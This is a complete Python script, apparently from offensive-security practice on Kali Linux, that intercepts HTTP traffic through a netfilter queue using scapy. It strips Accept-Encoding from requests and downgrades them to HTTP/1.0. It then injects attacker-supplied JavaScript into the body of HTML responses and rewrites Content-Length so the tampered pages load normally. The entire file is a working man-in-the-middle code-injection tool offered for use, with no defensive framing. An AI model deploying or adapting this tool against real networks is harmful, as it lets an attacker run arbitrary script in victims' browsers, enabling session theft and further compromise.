#!/usr/bin/env python
import os
import netfilterqueue
import argparse
import re
# Ensure we can import scapy
os.sys.path += ['/home/kali/.local/lib/python2.7/site-packages']
import scapy.all as scapy


ack_list = []


def set_load(packet, new_load):
    packet[scapy.Raw].load = new_load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print('[+] Request')
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
            load = load.replace('HTTP/1.1', 'HTTP/1.0')

        elif scapy_packet[scapy.TCP].sport == 80:
            print('[+] Response')
            load = load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search(r'(?:Content-Length:\s)(\d*)', load)
            if content_length_search and 'text/html' in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_load = set_load(scapy_packet, load)
            packet.set_payload(str(new_load))
    packet.accept()


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-c', dest='injection_code', help='JS code to inject into website.', required=True)
    args = parser.parse_args()
    injection_code = args.injection_code

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)  # 0 is the identifiable number passed as --queue-num param
    try:
        queue.run()
    except Exception as e:
        print('[!] Exception - {}'.format(str(e)))
        pass
